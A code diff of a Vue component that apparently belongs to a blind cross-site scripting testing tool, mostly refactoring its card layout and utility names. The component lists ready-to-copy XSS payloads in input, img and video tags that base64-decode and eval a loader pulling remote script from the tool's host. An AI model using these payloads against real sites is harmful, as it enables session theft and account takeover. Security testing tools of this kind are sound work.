@@ -1,37 +1,40 @@
 <template>
   <section class="flex flex-col gap-4">
-    <div
-      v-for="(payload, index) in payloads"
-      :key="index"
-      class="flex flex-col gap-4 bg-card rounded p-4"
-    >
-      <div v-html="payload.header"></div>
-      <label class="text-secondary uppercase">{{ payload.label }}</label>
-      <input type="text" class="bg-card-foreground/20 p-2 rounded" :value="payload.payload" />
-      <BasicButton
-        class="flex max-w-52 justify-center items-center transition-all duration-300"
-        @click="copyClipboard(payload.payload, index)"
-      >
-        <Transition name="fade-scale" mode="out-in">
-          <FontAwesomeIcon
-            :key="copiedIndex === index ? 'check' : 'copy'"
-            :icon="copiedIndex === index ? ['solid', 'check'] : ['solid', 'copy']"
-            class="mr-2 text-base"
-          />
-        </Transition>
-        Copy payload
-      </BasicButton>
-    </div>
+    <BasicCard v-for="(payload, index) in payloads" :key="index">
+      <template #header>
+        <div v-html="payload.header"></div>
+      </template>
+      <template #content>
+        <label class="text-secondary uppercase">{{ payload.label }}</label>
+        <input type="text" class="bg-card-foreground/20 p-2 rounded" :value="payload.payload" />
+      </template>
+      <template #footer>
+        <BasicButton
+          class="flex max-w-52 justify-center items-center transition-all duration-300"
+          @click="copyClipboard(payload.payload, index)"
+        >
+          <Transition name="fade-scale" mode="out-in">
+            <FontAwesomeIcon
+              :key="copiedIndex === index ? 'check' : 'copy'"
+              :icon="copiedIndex === index ? ['solid', 'check'] : ['solid', 'copy']"
+              class="mr-2 text-base"
+            />
+          </Transition>
+          Copy payload
+        </BasicButton>
+      </template>
+    </BasicCard>
   </section>
 </template>
 
 <script setup lang="ts">
 import BasicButton from '@/components/BasicButton.vue'
-import { html_encode, urlsafe_base64_encode } from '@/utils'
+import BasicCard from '@/components/BasicCard.vue'
+import { htmlEncode, urlsafeBase64Encode } from '@/utils'
 import { FontAwesomeIcon } from '@fortawesome/vue-fontawesome'
 import { ref } from 'vue'
 
-const base_domain = window.location.host
+const base_domain = 'localhost:8080/owbt8ghvsh'
 
 const payloads = [
   {
@@ -47,8 +50,8 @@ const payloads = [
   {
     header: '<code>&lt;input&gt;</code> Tag Payload',
     label: 'HTML5 input-based payload',
-    payload: `"><input onfocus=eval(atob(this.id)) id=${html_encode(
-      urlsafe_base64_encode(
+    payload: `"><input onfocus=eval(atob(this.id)) id=${htmlEncode(
+      urlsafeBase64Encode(
         `var a=document.createElement("script");a.src="https://${base_domain}";document.body.appendChild(a);`,
       ),
     )} autofocus>`,
@@ -57,8 +60,8 @@ const payloads = [
     //func: this.basic_script,
     header: '<code>&lt;img&gt;</code> Tag Payload',
     label: 'Image-based payload',
-    payload: `"><img src=x id=${html_encode(
-      urlsafe_base64_encode(
+    payload: `"><img src=x id=${htmlEncode(
+      urlsafeBase64Encode(
         `var a=document.createElement("script");a.src="https://${base_domain}";document.body.appendChild(a);`,
       ),
     )} onerror=eval(atob(this.id))>`,
@@ -67,8 +70,8 @@ const payloads = [
     //func: this.basic_script,
     header: '<code>&lt;video&gt;&lt;source&gt;</code> Tag Payload',
     label: 'Video-based payload',
-    payload: `"><video><source onerror=eval(atob(this.id)) id=${html_encode(
-      urlsafe_base64_encode(
+    payload: `"><video><source onerror=eval(atob(this.id)) id=${htmlEncode(
+      urlsafeBase64Encode(
         `var a=document.createElement("script");a.src="https://${base_domain}";document.body.appendChild(a);`,
       ),
     )}>`,
@@ -109,10 +112,9 @@ const copyClipboard = async (value: string, index: number) => {
 <style scoped>
 @reference "../assets/main.css";
 
-code {
+:deep(code) {
   @apply bg-card-foreground/20 text-secondary p-1 rounded;
 }
-
 .fade-scale-enter-active,
 .fade-scale-leave-active {
   @apply transition-all duration-300 ease-in-out;
